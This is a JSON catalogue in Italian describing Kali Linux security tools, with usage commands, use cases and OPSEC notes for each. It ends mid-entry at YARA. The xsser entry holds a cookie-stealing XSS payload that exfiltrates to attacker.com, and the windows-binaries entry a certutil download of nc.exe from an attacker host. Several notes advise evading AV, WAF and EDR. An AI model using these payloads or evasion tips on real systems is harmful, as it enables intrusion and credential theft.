    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "wig-ng",
    "name": "wig-ng",
    "version": "0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wig-ng/",
    "desc": "Web fingerprinting tool per identificare CMS, framework e componenti web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Wig-ng</strong> (Web Information Gatherer Next Generation) è un tool di fingerprinting web avanzato che identifica CMS, framework e componenti tecnologiche analizzando risposte HTTP, header, cookie e pattern nel codice HTML. È l'evoluzione di wig originale con database di signature aggiornato, algoritmi di detection migliorati e maggiore accuratezza nell'identificazione di versioni specifiche. Uno strumento essenziale nella fase di reconnaissance per mappare lo stack tecnologico dei target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive CMS Detection:</strong> identifica accuratamente WordPress, Joomla, Drupal, Magento, PrestaShop, TYPO3, Concrete5 e decine di altri CMS popolari tramite signature multiple per ridurre falsi positivi.</p><p><strong>Framework Fingerprinting:</strong> riconosce framework backend (Laravel, Django, Rails, Spring, ASP.NET) e frontend (React, Angular, Vue, jQuery) analizzando header caratteristici, file JavaScript e pattern HTML.</p><p><strong>Precise Version Detection:</strong> determina versioni specifiche di software tramite hash di file statici, meta tag, header e changelog per vulnerability matching preciso e ricerca CVE mirata.</p><p><strong>Plugin and Theme Detection:</strong> identifica estensioni, plugin, moduli e temi installati su CMS, rivelando superficie di attacco aggiuntiva spesso trascurata ma frequentemente vulnerabile.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Fingerprint base di un target\nwig-ng http://target.com\n\n# Output verboso con dettagli completi\nwig-ng -v http://target.com\n\n# Salva risultati in formato JSON\nwig-ng -o results.json http://target.com\n\n# Scan con timeout custom\nwig-ng -t 30 http://target.com\n\n# Scan attraverso proxy\nwig-ng --proxy http://127.0.0.1:8080 http://target.com\n\n# Scan di lista URL da file\nwig-ng -f urls.txt -o bulk_results.json\n\n# Solo CMS detection\nwig-ng --cms-only http://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Application Profiling</strong>, identificare completamente lo stack tecnologico di applicazioni web target come prima fase di un penetration test, mappando CMS, framework e componenti third-party.</p><p>Per <strong>Vulnerability Assessment</strong>, determinare versioni esatte di software per ricerca CVE note su database come NVD, Exploit-DB e Vulners, identificando potenziali vettori di attacco.</p><p>Per <strong>Attack Surface Mapping</strong>, enumerare plugin, temi e moduli installati che rappresentano superficie di attacco aggiuntiva, spesso con vulnerabilità non patchate.</p><p>Per <strong>Bug Bounty Recon</strong>, profilare rapidamente target di programmi bug bounty per identificare tecnologie con history di vulnerabilità frequenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> request multiple per fingerprinting a path specifici (readme.txt, license.txt, changelog) possono essere loggate e identificate come reconnaissance. User-Agent default è identificabile. Pattern di accesso sequenziale a file caratteristici può triggare alert su WAF. Usare proxy, custom User-Agent e rate limiting per ridurre visibilità durante operazioni stealth.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "wig",
    "name": "wig",
    "version": "0.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wig/",
    "desc": "Identifica CMS e plugin analizzando header, file statici e pattern specifici.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Wig</strong> (Web Information Gatherer) è uno strumento di fingerprinting che identifica CMS, plugin e tecnologie web analizzando header HTTP, file statici e pattern caratteristici. Costruisce un profilo tecnologico del target utile per identificare potenziali vulnerabilità.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>CMS Fingerprint:</strong> rileva WordPress, Joomla, Drupal, Magento e altri</p><p><strong>Plugin Detection:</strong> identifica plugin e estensioni installate</p><p><strong>Version Extraction:</strong> estrae numeri di versione da meta tag, file e header</p><p><strong>OS/Server Detection:</strong> identifica sistema operativo e web server</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan standard\nwig http://target.com\n\n# Scan con proxy\nwig -p http://proxy:8080 http://target.com\n\n# Output quieto\nwig -q http://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Reconnaissance</strong>, raccogliere informazioni tecnologiche su target web.</p><p>Per <strong>Vulnerability Research</strong>, identificare versioni per cercare exploit noti.</p><p>Per <strong>Asset Inventory</strong>, catalogare tecnologie in assessment su larga scala.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> accesso a path specifici per fingerprinting può essere loggato. Request a file caratteristici (readme.txt, license.txt) sono pattern riconoscibili. Usare rate limiting e proxy per ridurre visibilità.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "windows-binaries",
    "name": "windows-binaries",
    "version": "0.6.10",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/windows-binaries/",
    "desc": "Collezione binari Windows per pentesting: nc, wget, plink, accesschk e altri.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Windows-binaries</strong> è una collezione di utility Windows precompilate essenziali per penetration testing. Include tool di networking (nc, wget), tunneling (plink), privilege escalation check (accesschk) e altre utility spesso necessarie dopo aver ottenuto accesso a sistemi Windows.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Networking:</strong> netcat, wget, curl per trasferimento file e shell</p><p><strong>Tunneling:</strong> plink per SSH tunneling da Windows</p><p><strong>Enumeration:</strong> accesschk, whoami per privilege enumeration</p><p><strong>Ready to Deploy:</strong> binari statici pronti per upload su target</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Localizzazione binari\nls /usr/share/windows-binaries/\n\n# Copia su web server per transfer\ncp /usr/share/windows-binaries/nc.exe /var/www/html/\n\n# Usa su target Windows\n# certutil -urlcache -f http://attacker/nc.exe nc.exe</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Post-Exploitation</strong>, trasferire utility necessarie su sistemi Windows compromessi.</p><p>Per <strong>Shell Upgrade</strong>, ottenere reverse shell più stabili con netcat.</p><p>Per <strong>Pivoting</strong>, creare tunnel SSH attraverso sistemi Windows.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> binari noti sono signature per AV. Upload di file genera eventi nei log. Esecuzione di tool come nc/plink è monitorata da EDR. Usare versioni offuscate o alternative LOLBAS quando possibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "windows-privesc-check",
    "name": "windows-privesc-check",
    "version": "2.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/windows-privesc-check/",
    "desc": "Script per trovare misconfiguration di privilege escalation su sistemi Windows.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Windows-privesc-check</strong> è uno script che enumera configurazioni di sicurezza Windows per identificare percorsi di privilege escalation. Analizza permessi di servizi, scheduled task, registry, file system e altre aree comuni di misconfiguration.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Service Enumeration:</strong> identifica servizi con permessi deboli o unquoted paths</p><p><strong>Registry Check:</strong> trova chiavi registry scrivibili per persistence</p><p><strong>File Permissions:</strong> enumera file e directory con ACL vulnerabili</p><p><strong>Scheduled Tasks:</strong> analizza task per privilege escalation</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Esegui enumeration completa\nwindows-privesc-check2.exe --audit -a -o report.txt\n\n# Solo servizi\nwindows-privesc-check2.exe --audit -s\n\n# Output HTML\nwindows-privesc-check2.exe --audit -a -o report.html</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Privilege Escalation</strong>, trovare percorsi per elevare privilegi da utente normale.</p><p>Per <strong>Security Audit</strong>, verificare hardening di sistemi Windows.</p><p>Per <strong>Post-Exploitation</strong>, enumerazione automatica dopo accesso iniziale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> enumeration genera eventi nei log di sistema. Query WMI e registry sono monitorate da EDR. Tool è signature nota per AV. Preferire tecniche manuali o WinPEAS per maggiore stealth.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Windows"
    ],
    "notes": null
  },
  {
    "id": "wireshark-kali",
    "name": "wireshark",
    "version": "4.4.7",
    "icon": "../app/icons/wireshark-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wireshark/",
    "desc": "Analizzatore di protocolli di rete leader: cattura, dissect e analisi pacchetti GUI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Wireshark</strong> è l'analizzatore di protocolli di rete più utilizzato al mondo. Cattura traffico in tempo reale e analizza file pcap con dissector per centinaia di protocolli, filtri potenti e visualizzazioni grafiche per troubleshooting, analisi di sicurezza e forensics di rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Protocol Dissection:</strong> supporta 3000+ protocolli con decodifica automatica</p><p><strong>Live Capture:</strong> cattura traffico da interfacce ethernet, WiFi, USB e altro</p><p><strong>Display Filters:</strong> filtri potenti per isolare traffico di interesse</p><p><strong>Statistics:</strong> grafici, conversazioni, endpoints, protocol hierarchy</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia GUI\nwireshark\n\n# Cattura da CLI\ntshark -i eth0 -w capture.pcap\n\n# Filtro display\nwireshark -r capture.pcap -Y \"http.request\"\n\n# Estrai oggetti HTTP\ntshark -r capture.pcap --export-objects http,./output</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Forensics</strong>, analizzare traffico catturato per ricostruire attività.</p><p>Per <strong>Malware Analysis</strong>, identificare C2 e exfiltration nel traffico.</p><p>Per <strong>Troubleshooting</strong>, diagnosticare problemi di rete e applicazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> cattura passiva non genera traffico rilevabile. Interfaccia in promiscuous mode può essere rilevata da alcuni sistemi. Per cattura remota, traffic mirroring deve essere configurato su switch.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "witnessme",
    "name": "witnessme",
    "version": "1.5.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/witnessme/",
    "desc": "Screenshot web automatico per visual recon di applicazioni e servizi HTTP/HTTPS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WitnessMe</strong> è uno strumento per visual reconnaissance che automatizza la cattura di screenshot di servizi web. Naviga URL, scatta screenshot e organizza risultati in report HTML navigabili per identificare rapidamente applicazioni interessanti su larga scala.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Bulk Screenshots:</strong> cattura screenshot di centinaia di URL automaticamente</p><p><strong>Service Detection:</strong> identifica tecnologie web durante la cattura</p><p><strong>HTML Reports:</strong> genera gallery navigabile con tutti gli screenshot</p><p><strong>Signature Matching:</strong> rileva applicazioni note tramite pattern visivi</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Screenshot da lista URL\nwitnessme screenshot -f urls.txt\n\n# Screenshot range IP\nwitnessme screenshot 192.168.1.0/24\n\n# Con output directory\nwitnessme screenshot -o output_dir -f urls.txt\n\n# Genera report\nwitnessme report output_dir</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Visual Reconnaissance</strong>, identificare rapidamente applicazioni web di interesse.</p><p>Per <strong>Asset Discovery</strong>, catalogare visivamente servizi web in range IP.</p><p>Per <strong>Default Credentials</strong>, identificare login page di device e applicazioni note.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> browser headless genera request con fingerprint identificabile. Alto volume di request può triggare rate limiting. User-Agent e header sono loggati. Usare delay e proxy per ridurre visibilità.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Visual_Recon"
    ],
    "notes": null
  },
  {
    "id": "wordlistraider",
    "name": "wordlistraider",
    "version": "1.0~git20200927",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wordlistraider/",
    "desc": "Combina e ottimizza wordlist multiple rimuovendo duplicati e normalizzando.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WordlistRaider</strong> è uno strumento per combinare, ottimizzare e gestire wordlist per penetration testing. Unisce multiple wordlist rimuovendo duplicati, normalizzando contenuti e generando liste ottimizzate per specifici casi d'uso come password cracking o directory fuzzing.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Merge & Dedupe:</strong> combina wordlist multiple eliminando duplicati</p><p><strong>Normalization:</strong> standardizza encoding, case e formati</p><p><strong>Filtering:</strong> filtra per lunghezza, pattern, caratteri speciali</p><p><strong>Statistics:</strong> analizza composizione e coverage delle wordlist</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Combina wordlist\nwordlistraider -m list1.txt list2.txt -o combined.txt\n\n# Rimuovi duplicati\nwordlistraider -d input.txt -o deduped.txt\n\n# Filtra per lunghezza\nwordlistraider --min 8 --max 16 input.txt -o filtered.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Wordlist Preparation</strong>, creare liste ottimizzate per specifici target o policy.</p><p>Per <strong>Password Cracking</strong>, combinare wordlist tematiche per attacchi mirati.</p><p>Per <strong>Efficiency</strong>, ridurre dimensione liste eliminando ridondanze.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> tool offline che non genera traffico. Wordlist ottimizzate riducono tempo e rumore di attacchi brute force. Dimensione wordlist influenza durata e detectability degli attacchi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "wpa-sycophant",
    "name": "wpa-sycophant",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wpa-sycophant/",
    "desc": "Relay per attacchi EAP su reti WPA Enterprise catturando credenziali RADIUS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WPA-Sycophant</strong> è uno strumento per attacchi relay su reti WPA Enterprise che utilizzano EAP. Intercetta autenticazioni EAP e le relay verso server RADIUS legittimi per catturare hash delle credenziali o ottenere accesso non autorizzato alla rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>EAP Relay:</strong> relay di autenticazioni EAP-MSCHAPv2 e altri metodi</p><p><strong>Credential Capture:</strong> cattura challenge/response per offline cracking</p><p><strong>Evil Twin:</strong> funziona con rogue AP per intercettare autenticazioni</p><p><strong>Hash Extraction:</strong> estrae hash NetNTLMv1/v2 da sessioni EAP</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Configura con hostapd-wpe\nwpa_sycophant -c sycophant.conf\n\n# Avvia relay\nwpa_sycophant -i wlan0 -s radius.target.com\n\n# Cattura credenziali\nwpa_sycophant -i wlan0 -o captured.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WPA Enterprise Testing</strong>, verificare sicurezza di configurazioni 802.1X. Per <strong>Credential Harvesting</strong>, catturare credenziali di dominio via WiFi.</p><p>Per <strong>Network Access</strong>, ottenere accesso relay a reti enterprise.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> rogue AP rilevabile da WIDS. Relay traffic può essere identificato da anomalie nei log RADIUS. Certificati fake generano warning sui client configurati correttamente. Richiede prossimità fisica.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "wpscan",
    "name": "wpscan",
    "version": "3.8.28",
    "icon": "../app/icons/wpscan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wpscan/",
    "desc": "Scanner WordPress: enumera utenti, plugin, temi vulnerabili con database CVE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WPScan</strong> è lo scanner di sicurezza WordPress più completo disponibile. Enumera utenti, plugin, temi e versioni WordPress, identificando vulnerabilità note tramite database CVE integrato. Supporta brute force password e detection di configurazioni insicure.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumeration:</strong> identifica utenti, plugin, temi con versioni specifiche</p><p><strong>Vulnerability Database:</strong> database CVE aggiornato per WordPress ecosystem</p><p><strong>Password Attack:</strong> brute force su login WordPress con wordlist</p><p><strong>API Integration:</strong> WPScan API per vulnerability lookup in tempo reale</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan completo\nwpscan --url https://target.com\n\n# Enumera utenti e plugin\nwpscan --url https://target.com -e u,ap\n\n# Con API token per vuln lookup\nwpscan --url https://target.com --api-token TOKEN\n\n# Brute force password\nwpscan --url https://target.com -U users.txt -P passwords.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WordPress Security</strong>, assessment completo di installazioni WordPress.</p><p>Per <strong>Plugin Audit</strong>, identificare plugin vulnerabili o outdated.</p><p>Per <strong>Penetration Testing</strong>, trovare entry point in siti WordPress.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> enumeration genera traffico riconoscibile nei log. Brute force può triggare lockout e alert. User-Agent WPScan è signature nota. WAF WordPress-aware bloccano scansioni aggressive.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "CMS",
      "General"
    ],
    "notes": null
  },
  {
    "id": "xplico",
    "name": "xplico",
    "version": "1.2.2",
    "icon": "../app/icons/xplico-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/xplico/",
    "desc": "Estrae dati da catture pcap: email, HTTP, VoIP, file per network forensics.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Xplico</strong> è un framework di network forensics che estrae automaticamente dati applicativi da catture di traffico. Ricostruisce email, sessioni HTTP, chiamate VoIP, file trasferiti e altre comunicazioni da file pcap per investigazioni forensi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Protocol Decoding:</strong> supporta HTTP, SIP, IMAP, POP, FTP, SMTP e molti altri</p><p><strong>File Carving:</strong> estrae file trasferiti da sessioni di rete</p><p><strong>VoIP Reconstruction:</strong> ricostruisce chiamate audio da traffico SIP/RTP</p><p><strong>Web Interface:</strong> GUI web per gestione casi e visualizzazione risultati</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia servizio web\nsudo /etc/init.d/xplico start\n\n# Accedi via browser\n# http://localhost:9876\n\n# Crea caso e carica pcap\n# tramite interfaccia web\n\n# CLI per processing\nxplico -m pcap -f capture.pcap</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Forensics</strong>, ricostruire attività da catture di traffico in investigazioni.</p><p>Per <strong>Incident Response</strong>, analizzare comunicazioni durante security breach.</p><p>Per <strong>Evidence Collection</strong>, estrarre prove da traffico intercettato legalmente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> tool di analisi offline che non genera traffico. Risultati possono contenere dati sensibili che richiedono protezione. Cattura originale deve essere preservata per chain of custody.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Network_Forensics"
    ],
    "notes": null
  },
  {
    "id": "xspy",
    "name": "xspy",
    "version": "1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/xspy/",
    "desc": "Keylogger per X Window System che cattura input da tutte le applicazioni GUI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>XSpy</strong> è un keylogger per sistemi Linux con X Window System che cattura input da tastiera attraverso tutte le applicazioni GUI. Sfrutta le API X11 per intercettare eventi keyboard senza modificare le applicazioni target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>X11 Keylogging:</strong> cattura keystroke da qualsiasi finestra X Window</p><p><strong>Window Tracking:</strong> associa input alla finestra attiva</p><p><strong>Timestamp:</strong> registra timing preciso di ogni keystroke</p><p><strong>Output Logging:</strong> salva catture su file per analisi successiva</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia keylogger\nxspy\n\n# Output su file\nxspy > keylog.txt\n\n# Con display specifico\nDISPLAY=:0 xspy</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Credential Capture</strong>, catturare password digitate in sessioni X11 compromesse.</p><p>Per <strong>Post-Exploitation</strong>, monitorare attività utente su sistemi Linux GUI.</p><p>Per <strong>Security Testing</strong>, verificare protezioni contro keylogging X11.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> processo visibile in lista processi. Wayland non è vulnerabile a questa tecnica. Accesso a X11 socket richiede privilegi appropriati. Security-focused desktop possono bloccare XTEST extension.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "xsrfprobe",
    "name": "xsrfprobe",
    "version": "2.3.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/xsrfprobe/",
    "desc": "Scanner e exploiter CSRF automatico con detection di token e bypass tecniche.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>XSRFProbe</strong> è uno scanner CSRF avanzato che automatizza detection e exploitation di vulnerabilità Cross-Site Request Forgery. Analizza token CSRF, identifica protezioni deboli e genera PoC exploit per validare vulnerabilità trovate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Token Analysis:</strong> analizza implementazione e robustezza di token CSRF</p><p><strong>Bypass Techniques:</strong> testa bypass comuni come token reuse, predictability, referer check</p><p><strong>PoC Generation:</strong> genera HTML exploit per validare vulnerabilità</p><p><strong>Crawling:</strong> spider automatico per trovare form e endpoint vulnerabili</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan singola pagina\nxsrfprobe -u https://target.com/form\n\n# Crawl e scan\nxsrfprobe -u https://target.com --crawl\n\n# Con cookie di sessione\nxsrfprobe -u https://target.com -c \"session=abc123\"\n\n# Genera PoC\nxsrfprobe -u https://target.com --poc</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>CSRF Testing</strong>, identificare form e API vulnerabili a CSRF.</p><p>Per <strong>Token Analysis</strong>, validare robustezza di implementazioni anti-CSRF.</p><p>Per <strong>Exploit Development</strong>, creare PoC per report di vulnerabilità.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> request multiple a form sono loggate. Pattern di test possono triggare WAF. PoC exploit devono essere usati solo in ambiente controllato. Non eseguire exploit su sistemi production senza autorizzazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "CSRF"
    ],
    "notes": null
  },
  {
    "id": "xsser",
    "name": "xsser",
    "version": "1.8.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/xsser/",
    "desc": "Framework XSS automatico per detection, bypass WAF e generazione payload avanzati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>XSSer</strong> è un framework automatizzato completo per detection e exploitation di vulnerabilità Cross-Site Scripting. Supporta test approfonditi di XSS reflected, stored e DOM-based con un arsenale di tecniche avanzate per bypass WAF, encoding multipli, obfuscation e generazione di payload personalizzati. Include funzionalità di exploitation complete per dimostrare l'impatto reale delle vulnerabilità trovate durante penetration test.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive XSS Detection:</strong> identifica automaticamente reflected XSS, stored XSS e DOM-based XSS attraverso injection intelligente, analisi delle risposte e tracking del payload attraverso l'applicazione con supporto per scenari complessi multi-step.</p><p><strong>Advanced WAF Bypass:</strong> libreria estesa di tecniche di evasion inclusi encoding multipli (URL, HTML, Base64, Unicode), obfuscation JavaScript, splitting di payload, case variation e bypass specifici per WAF comuni come ModSecurity, Cloudflare e AWS WAF.</p><p><strong>Custom Payload Generator:</strong> genera payload personalizzati per scenari specifici con template modificabili, supporto per polyglot payload, context-aware injection e adattamento automatico al contesto HTML/JavaScript/attribute.</p><p><strong>Full Exploitation Capabilities:</strong> funzionalità complete di exploitation inclusi cookie stealing con exfiltration server, keylogging JavaScript, screenshot capture, phishing overlay, BeEF integration e reverse shell via XSS.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test singolo URL con parametro vulnerabile\nxsser -u \"https://target.com/page?param=XSS\"\n\n# Automatic mode con tutti i bypass\nxsser -u \"https://target.com/page?param=XSS\" --auto\n\n# Cookie stealing con server di raccolta\nxsser -u \"https://target.com/page?param=XSS\" --Fp \"&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;\"\n\n# Crawl dell'applicazione e test XSS\nxsser --crawl \"https://target.com\" -c 100\n\n# Con proxy Burp/ZAP per analisi\nxsser -u \"https://target.com/page?param=XSS\" --proxy http://127.0.0.1:8080\n\n# DOM XSS testing\nxsser -u \"https://target.com/page#XSS\" --Dom\n\n# POST request testing\nxsser -u \"https://target.com/form\" -p \"username=XSS&amp;password=test\"\n\n# Con custom headers e cookies\nxsser -u \"https://target.com/page?param=XSS\" --cookie \"session=abc123\" --headers \"X-Custom: value\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Application Pentesting</strong>, identificare sistematicamente vulnerabilità XSS in applicazioni web durante assessment di sicurezza, testando input validation e output encoding.</p><p>Per <strong>WAF Effectiveness Testing</strong>, validare l'efficacia di Web Application Firewall contro payload XSS avanzati, identificando gap nelle regole di protezione.</p><p>Per <strong>Security Research</strong>, sviluppare e testare nuovi payload XSS per scenari di exploitation specifici, contribuendo alla ricerca sulla sicurezza web.</p><p>Per <strong>Bug Bounty Hunting</strong>, automatizzare la ricerca di XSS su larga scala durante programmi bug bounty con reporting dettagliato delle vulnerabilità trovate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> payload XSS nei log applicativi e WAF sono facilmente identificabili e possono generare alert immediati. WAF moderni con machine learning rilevano pattern di test anche con encoding. L'exploitation reale (cookie stealing, keylogging) lascia tracce nei log browser, network e server. Usare solo in ambiente autorizzato con permesso scritto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "XSS"
    ],
    "notes": null
  },
  {
    "id": "yara",
    "name": "yara",
    "version": "4.5.4",
    "icon": "../app/icons/yara-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/yara/",
    "desc": "Pattern matching per malware analysis: identifica sample con regole personalizzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>YARA</strong> è lo standard de facto per pattern matching nella malware analysis e threat hunting, utilizzato da ricercatori di sicurezza, SOC analyst e incident responder in tutto il mondo. Permette di creare regole personalizzate altamente espressive per identificare e classificare malware basandosi su pattern testuali e binari, condizioni logiche complesse, metadata e caratteristiche strutturali dei file. È il cuore di molti sistemi di detection enterprise e piattaforme di threat intelligence.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Advanced Pattern Matching:</strong> match potente su stringhe ASCII/Unicode, pattern esadecimali con wildcard e jump, espressioni regolari, e condizioni booleane complesse che permettono di esprimere signature sofisticate per malware polimorfico e varianti.</p><p><strong>Expressive Rule Language:</strong> linguaggio dedicato per definire signature malware con supporto per variabili, condizioni logiche (and, or, not), operatori di conteggio, range, offset e lunghezza per creare detection precise con bassi falsi positivi.</p><p><strong>Extensible Module System:</strong> moduli integrati per analisi di PE (import, export, section, resources), ELF, Mach-O, hash (MD5, SHA256, imphash), math, cuckoo sandbox e possibilità di creare moduli custom in C.</p><p><strong>Enterprise Scalability:</strong> engine ottimizzato per scansione ad alta velocità di grandi dataset di file, con supporto per multi-threading, scanning di processi in memoria e integrazione con sandbox e SIEM.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan singolo file con regola\nyara rule.yar suspicious_file\n\n# Scan directory ricorsivo con multiple regole\nyara -r rules_directory/ /path/to/samples/\n\n# Output con metadata delle regole\nyara -m rule.yar file\n\n# Scan con tag filtering\nyara -t ransomware rules/ samples/\n\n# Output solo nomi file che matchano\nyara -l rule.yar directory/\n\n# Scan processo in memoria (Linux)\nyara 